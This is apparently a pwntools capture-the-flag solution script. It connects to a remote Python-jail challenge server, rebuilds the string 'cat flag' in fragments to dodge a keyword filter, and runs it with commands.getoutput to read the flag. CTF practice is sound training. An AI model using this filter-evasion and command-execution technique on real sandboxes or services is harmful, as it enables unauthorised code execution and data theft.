#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))

def cmd(s):
    io.sendlineafter('>>> ', s)

io = remote('pwn.sixstars.team', 24101)
cmd('import commands')
cmd("s = 'ca'")
cmd("s += 't fla'")
cmd("s += 'g'")
cmd('print commands.getoutput(s)')

io.interactive()

